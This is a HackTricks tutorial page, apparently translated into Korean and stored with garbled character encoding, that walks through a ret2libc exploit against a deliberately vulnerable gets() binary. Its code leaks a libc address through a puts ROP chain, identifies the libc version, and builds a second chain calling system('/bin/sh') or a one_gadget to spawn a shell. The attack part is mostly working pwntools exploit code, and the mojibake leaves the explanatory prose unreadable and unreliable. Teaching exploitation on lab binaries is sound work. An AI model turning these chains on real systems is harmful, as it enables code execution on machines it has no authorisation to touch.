# ROPë¥¼ ì´ìš©í•œ libc ì£¼ì†Œ ìœ ì¶œ

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ê°„ë‹¨ ìš”ì•½

1. **ì˜¤ë²„í”Œë¡œìš° ì˜¤í”„ì…‹ ì°¾ê¸°**
2. **`POP_RDI` ê°€ì ¯, `PUTS_PLT` ë° `MAIN` ì°¾ê¸°**
3. ì´ì „ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ puts ë˜ëŠ” ë‹¤ë¥¸ libc í•¨ìˆ˜ì˜ **ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ìœ ì¶œí•˜ê³  libc ë²„ì „ ì°¾ê¸°** ([ë‹¤ìš´ë¡œë“œí•˜ê¸°](https://libc.blukat.me))
4. ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ROPë¥¼ ê³„ì‚°í•˜ê³  ì´ë¥¼ ì´ìš©í•´ ìµìŠ¤í”Œë¡œì‡í•˜ê¸°**

## ì—°ìŠµí•  ë‹¤ë¥¸ íŠœí† ë¦¬ì–¼ ë° ë°”ì´ë„ˆë¦¬

ì´ íŠœí† ë¦¬ì–¼ì€ ë‹¤ìŒ íŠœí† ë¦¬ì–¼ì—ì„œ ì œì•ˆëœ ì½”ë“œ/ë°”ì´ë„ˆë¦¬ë¥¼ ìµìŠ¤í”Œë¡œì‡í•  ê²ƒì…ë‹ˆë‹¤: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
ë˜ ë‹¤ë¥¸ ìœ ìš©í•œ íŠœí† ë¦¬ì–¼: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## ì½”ë“œ

íŒŒì¼ ì´ë¦„: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC ì£¼ì†Œ ìœ ì¶œ í…œí”Œë¦¿

ë‚˜ëŠ” ì—¬ê¸° ìœ„ì¹˜í•œ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ì„ ë§Œë“¤ ê²ƒì´ë‹¤.\
ìµìŠ¤í”Œë¡œì‡ì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì·¨ì•½í•œ ë°”ì´ë„ˆë¦¬ì™€ ê°™ì€ ë””ë ‰í† ë¦¬ì— ë°°ì¹˜í•œ í›„ ìŠ¤í¬ë¦½íŠ¸ì— í•„ìš”í•œ ë°ì´í„°ë¥¼ ì œê³µí•˜ë¼:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- ì˜¤í”„ì…‹ ì°¾ê¸°

í…œí”Œë¦¿ì€ ìµìŠ¤í”Œë¡œì‡ì„ ê³„ì†í•˜ê¸° ì „ì— ì˜¤í”„ì…‹ì´ í•„ìš”í•˜ë‹¤. ì œê³µëœ ê²½ìš°, í•„ìš”í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì˜¤í”„ì…‹ì„ ì°¾ì„ ê²ƒì´ë‹¤ (ê¸°ë³¸ê°’ `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**ì‹¤í–‰** `python template.py` í•˜ë©´ í”„ë¡œê·¸ë¨ì´ ì¶©ëŒí•˜ëŠ” GDB ì½˜ì†”ì´ ì—´ë¦½ë‹ˆë‹¤. ê·¸ ì•ˆì—ì„œ **GDB ì½˜ì†”**ì—ì„œ `x/wx $rsp`ë¥¼ ì‹¤í–‰í•˜ì—¬ RIPë¥¼ ë®ì–´ì“¸ **ë°”ì´íŠ¸**ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ **python** ì½˜ì†”ì„ ì‚¬ìš©í•˜ì—¬ **ì˜¤í”„ì…‹**ì„ ê°€ì ¸ì˜µë‹ˆë‹¤:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

ì˜¤í”„ì…‹(ì´ ê²½ìš° 40)ì„ ì°¾ì€ í›„, í•´ë‹¹ ê°’ì„ ì‚¬ìš©í•˜ì—¬ í…œí”Œë¦¿ ë‚´ì˜ OFFSET ë³€ìˆ˜ë¥¼ ë³€ê²½í•©ë‹ˆë‹¤.\
`OFFSET = "A" * 40`

ë˜ ë‹¤ë¥¸ ë°©ë²•ì€: `pattern create 1000` -- _retê¹Œì§€ ì‹¤í–‰_ -- `pattern seach $rsp`ë¥¼ GEFì—ì„œ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## 2- ê°€ì ¯ ì°¾ê¸°

ì´ì œ ë°”ì´ë„ˆë¦¬ ë‚´ì—ì„œ ROP ê°€ì ¯ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. ì´ ROP ê°€ì ¯ì€ `puts`ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‚¬ìš© ì¤‘ì¸ **libc**ë¥¼ ì°¾ëŠ” ë° ìœ ìš©í•˜ë©°, ë‚˜ì¤‘ì— **ìµœì¢… ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤í–‰**í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
The `PUTS_PLT`ëŠ” **í•¨ìˆ˜ puts**ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤.\
`MAIN_PLT`ëŠ” **ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë‹¤ì‹œ** **ì•…ìš©**í•˜ê¸° ìœ„í•´ í•œ ë²ˆì˜ ìƒí˜¸ì‘ìš© í›„ì— **main í•¨ìˆ˜**ë¥¼ ë‹¤ì‹œ í˜¸ì¶œí•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤ (ë¬´í•œí•œ ì•…ìš© ë¼ìš´ë“œ). **ê° ROPì˜ ëì—ì„œ í”„ë¡œê·¸ë¨ì„ ë‹¤ì‹œ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.**\
**POP\_RDI**ëŠ” í˜¸ì¶œëœ í•¨ìˆ˜ì— **ë§¤ê°œë³€ìˆ˜**ë¥¼ **ì „ë‹¬**í•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤.

ì´ ë‹¨ê³„ì—ì„œëŠ” pwntoolsê°€ ì‹¤í–‰ ì¤‘ì— ëª¨ë“  ê²ƒì„ ì°¾ê¸° ë•Œë¬¸ì— ì•„ë¬´ê²ƒë„ ì‹¤í–‰í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.

## 3- libc ë¼ì´ë¸ŒëŸ¬ë¦¬ ì°¾ê¸°

ì´ì œ ì–´ë–¤ ë²„ì „ì˜ **libc** ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ì°¾ì„ ì‹œê°„ì…ë‹ˆë‹¤. ê·¸ë ‡ê²Œ í•˜ê¸° ìœ„í•´ ìš°ë¦¬ëŠ” **í•¨ìˆ˜** `puts`ì˜ ë©”ëª¨ë¦¬ ë‚´ **ì£¼ì†Œ**ë¥¼ **ëˆ„ì¶œ**í•œ ë‹¤ìŒ, í•´ë‹¹ ì£¼ì†Œì—ì„œ puts ë²„ì „ì´ ìˆëŠ” **ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „**ì„ **ê²€ìƒ‰**í•  ê²ƒì…ë‹ˆë‹¤.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
ì´ë ‡ê²Œ í•˜ë ¤ë©´, ì‹¤í–‰ëœ ì½”ë“œì˜ ê°€ì¥ ì¤‘ìš”í•œ ì¤„ì€:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
ì´ê²ƒì€ **RIP**ë¥¼ **ë®ì–´ì“°ê¸°**í•  ìˆ˜ ìˆì„ ë•Œê¹Œì§€ ëª‡ ë°”ì´íŠ¸ë¥¼ ì „ì†¡í•  ê²ƒì…ë‹ˆë‹¤: `OFFSET`.\
ê·¸ëŸ° ë‹¤ìŒ, **ì£¼ì†Œ**ë¥¼ `POP_RDI` ê°€ì ¯ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ ë‹¤ìŒ ì£¼ì†Œ(`FUNC_GOT`)ê°€ **RDI** ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥ë˜ë„ë¡ í•©ë‹ˆë‹¤. ì´ëŠ” ìš°ë¦¬ê°€ **putsë¥¼ í˜¸ì¶œ**í•˜ê³  `PUTS_GOT`ì˜ **ì£¼ì†Œ**ë¥¼ ì „ë‹¬í•˜ê¸°ë¥¼ ì›í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. puts í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†ŒëŠ” `PUTS_GOT`ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— ì €ì¥ë©ë‹ˆë‹¤.\
ê·¸ í›„, `PUTS_PLT`ê°€ í˜¸ì¶œë  ê²ƒì…ë‹ˆë‹¤( **RDI** ì•ˆì— `PUTS_GOT`ê°€ í¬í•¨ë¨) ê·¸ë˜ì„œ putsëŠ” `PUTS_GOT` ì•ˆì˜ **ë‚´ìš©ì„ ì½**ê³  (**ë©”ëª¨ë¦¬ì—ì„œ puts í•¨ìˆ˜ì˜ ì£¼ì†Œ**) **ì¶œë ¥**í•  ê²ƒì…ë‹ˆë‹¤.\
ë§ˆì§€ë§‰ìœ¼ë¡œ, **main í•¨ìˆ˜ê°€ ë‹¤ì‹œ í˜¸ì¶œ**ë˜ì–´ ìš°ë¦¬ëŠ” ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë‹¤ì‹œ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë ‡ê²Œ ìš°ë¦¬ëŠ” **puts í•¨ìˆ˜ë¥¼ ì†ì—¬** **ë©”ëª¨ë¦¬**ì—ì„œ **puts** í•¨ìˆ˜ì˜ **ì£¼ì†Œ**ë¥¼ **ì¶œë ¥**í•˜ê²Œ í–ˆìŠµë‹ˆë‹¤(ì´ëŠ” **libc** ë¼ì´ë¸ŒëŸ¬ë¦¬ ì•ˆì— ìˆìŠµë‹ˆë‹¤). ì´ì œ ê·¸ ì£¼ì†Œë¥¼ ì•Œê²Œ ë˜ì—ˆìœ¼ë‹ˆ **ì–´ë–¤ libc ë²„ì „ì´ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../../../.gitbook/assets/image (141).png>)

ìš°ë¦¬ê°€ **ë¡œì»¬** ë°”ì´ë„ˆë¦¬ë¥¼ **ì•…ìš©**í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì–´ë–¤ ë²„ì „ì˜ **libc**ê°€ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ì•Œì•„ë‚¼ í•„ìš”ëŠ” ì—†ìŠµë‹ˆë‹¤(ë‹¨ì§€ `/lib/x86_64-linux-gnu/libc.so.6`ì—ì„œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì°¾ìœ¼ë©´ ë©ë‹ˆë‹¤).\
í•˜ì§€ë§Œ ì›ê²© ìµìŠ¤í”Œë¡œì‡ì˜ ê²½ìš°, ì—¬ê¸°ì„œ ì–´ë–»ê²Œ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤:

### 3.1- libc ë²„ì „ ê²€ìƒ‰ (1)

ì›¹ í˜ì´ì§€ì—ì„œ ì–´ë–¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://libc.blukat.me/](https://libc.blukat.me)\
ì´ê³³ì—ì„œëŠ” ë°œê²¬ëœ **libc** ë²„ì „ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- libc ë²„ì „ ê²€ìƒ‰ (2)

ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

ì´ ì‘ì—…ì€ ì‹œê°„ì´ ê±¸ë¦´ ìˆ˜ ìˆìœ¼ë‹ˆ ì¸ë‚´ì‹¬ì„ ê°€ì§€ì„¸ìš”.\
ì´ ì‘ì—…ì´ ì‘ë™í•˜ë ¤ë©´ ë‹¤ìŒì´ í•„ìš”í•©ë‹ˆë‹¤:

* Libc ì‹¬ë³¼ ì´ë¦„: `puts`
* ìœ ì¶œëœ libc ì£¼ì†Œ: `0x7ff629878690`

ìš°ë¦¬ëŠ” ì–´ë–¤ **libc**ê°€ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
ìš°ë¦¬ëŠ” 2ê°œì˜ ì¼ì¹˜ë¥¼ ì–»ìŠµë‹ˆë‹¤ (ì²« ë²ˆì§¸ê°€ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©´ ë‘ ë²ˆì§¸ë¥¼ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤). ì²« ë²ˆì§¸ ê²ƒì„ ë‹¤ìš´ë¡œë“œí•˜ì‹­ì‹œì˜¤:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so`ì—ì„œ libcë¥¼ ìš°ë¦¬ì˜ ì‘ì—… ë””ë ‰í† ë¦¬ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤.

### 3.3- ëˆ„ì¶œí•  ë‹¤ë¥¸ í•¨ìˆ˜ë“¤
```python
puts
printf
__libc_start_main
read
gets
```
## 4- libc ì£¼ì†Œ ì°¾ê¸° ë° ìµìŠ¤í”Œë¡œì‡

ì´ ì‹œì ì—ì„œ ìš°ë¦¬ëŠ” ì‚¬ìš©ëœ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë¡œì»¬ ë°”ì´ë„ˆë¦¬ë¥¼ ìµìŠ¤í”Œë¡œì‡í•˜ê³  ìˆìœ¼ë¯€ë¡œ ë‹¤ìŒì„ ì‚¬ìš©í•˜ê² ìŠµë‹ˆë‹¤: `/lib/x86_64-linux-gnu/libc.so.6`

ë”°ë¼ì„œ `template.py`ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ **libc** ë³€ìˆ˜ë¥¼ ë‹¤ìŒìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #ì•Œê³  ìˆì„ ë•Œ ë¼ì´ë¸ŒëŸ¬ë¦¬ ê²½ë¡œ ì„¤ì •`

**libc ë¼ì´ë¸ŒëŸ¬ë¦¬**ì— **ê²½ë¡œ**ë¥¼ ì œê³µí•˜ë©´ ë‚˜ë¨¸ì§€ **ìµìŠ¤í”Œë¡œì‡ì´ ìë™ìœ¼ë¡œ ê³„ì‚°ë©ë‹ˆë‹¤**.

`get_addr` í•¨ìˆ˜ ë‚´ì—ì„œ **libcì˜ ê¸°ë³¸ ì£¼ì†Œ**ê°€ ê³„ì‚°ë  ê²ƒì…ë‹ˆë‹¤:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**ìµœì¢… libc ê¸°ë³¸ ì£¼ì†ŒëŠ” 00ìœ¼ë¡œ ëë‚˜ì•¼ í•©ë‹ˆë‹¤.** ê·¸ë ‡ì§€ ì•Šë‹¤ë©´ ì˜ëª»ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ìœ ì¶œí–ˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ê·¸ëŸ° ë‹¤ìŒ, í•¨ìˆ˜ `system`ì˜ ì£¼ì†Œì™€ ë¬¸ìì—´ _"/bin/sh"_ì˜ **ì£¼ì†Œ**ëŠ” **libc**ì˜ **ê¸°ë³¸ ì£¼ì†Œ**ì—ì„œ **ê³„ì‚°**ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  **libc ë¼ì´ë¸ŒëŸ¬ë¦¬**ê°€ ì œê³µë©ë‹ˆë‹¤.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
ë§ˆì§€ë§‰ìœ¼ë¡œ, /bin/sh ì‹¤í–‰ ìµìŠ¤í”Œë¡œì‡ì´ ì¤€ë¹„ë  ê²ƒì…ë‹ˆë‹¤:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
ë§ˆì§€ë§‰ ROP(`rop1`)ì€ ë‹¤ì‹œ main í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©° ëë‚¬ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ìš°ë¦¬ëŠ” **ë‹¤ì‹œ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** **ì˜¤ë²„í”Œë¡œìš°**ë¥¼ ì´ìš©í•˜ì—¬ (ê·¸ë˜ì„œ `OFFSET`ì´ ì—¬ê¸° ë‹¤ì‹œ ìˆëŠ” ê²ƒì…ë‹ˆë‹¤). ê·¸ëŸ° ë‹¤ìŒ, ìš°ë¦¬ëŠ” `POP_RDI`ë¥¼ í˜¸ì¶œí•˜ì—¬ **ì£¼ì†Œ**ë¥¼ _"/bin/sh"_ (`BINSH`)ë¡œ ì§€ì •í•˜ê³  **system** í•¨ìˆ˜(`SYSTEM`)ë¥¼ í˜¸ì¶œí•˜ê³ ì í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ _"/bin/sh"_ì˜ ì£¼ì†Œê°€ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬ë  ê²ƒì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.\
ë§ˆì§€ë§‰ìœ¼ë¡œ, **exit í•¨ìˆ˜ì˜ ì£¼ì†Œ**ê°€ **í˜¸ì¶œ**ë˜ì–´ í”„ë¡œì„¸ìŠ¤ê°€ **ì •ìƒì ìœ¼ë¡œ ì¢…ë£Œ**ë˜ê³  ì–´ë–¤ ê²½ê³ ë„ ìƒì„±ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

**ì´ë ‡ê²Œ í•˜ë©´ ê³µê²©ì´ \_/bin/sh**\_\*\* ì…¸ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- ONE\_GADGET ì‚¬ìš©í•˜ê¸°

ëŒ€ì‹  **system**ê³¼ **"/bin/sh"**ë¥¼ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹  [**ONE\_GADGET**](https://github.com/david942j/one\_gadget)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì…¸ì„ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. **ONE\_GADGET**ì€ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì—ì„œ ë‹¨ í•˜ë‚˜ì˜ **ROP ì£¼ì†Œ**ë§Œìœ¼ë¡œ ì…¸ì„ ì–»ëŠ” ë°©ë²•ì„ ì°¾ìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ ëª‡ ê°€ì§€ ì œì•½ì´ ìˆìœ¼ë©°, ê°€ì¥ ì¼ë°˜ì ì´ê³  í”¼í•˜ê¸° ì‰¬ìš´ ê²ƒì€ `[rsp+0x30] == NULL`ì…ë‹ˆë‹¤. **RSP** ë‚´ë¶€ì˜ ê°’ì„ ì œì–´í•˜ë¯€ë¡œ NULL ê°’ì„ ì¢€ ë” ë³´ë‚´ê¸°ë§Œ í•˜ë©´ ì œì•½ì„ í”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ê¸° ìœ„í•œ í…œí”Œë¦¿ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Common problems

### MAIN\_PLT = elf.symbols\['main'] not found

"main" ì‹¬ë³¼ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°, ë©”ì¸ ì½”ë“œê°€ ì–´ë””ì— ìˆëŠ”ì§€ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ê·¸ë¦¬ê³  ì£¼ì†Œë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤:
```python
MAIN_PLT = 0x401080
```
### Puts not found

ì´ì§„ íŒŒì¼ì´ Putsë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš° ë‹¤ìŒì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

ëª¨ë“  ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í•œ í›„ ì´ **ì˜¤ë¥˜**ë¥¼ ë°œê²¬í•˜ë©´: `sh: 1: %s%s%s%s%s%s%s%s: not found`

**"/bin/sh"ì˜ ì£¼ì†Œì—ì„œ 64 ë°”ì´íŠ¸ë¥¼ ë¹¼ë³´ì„¸ìš”**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
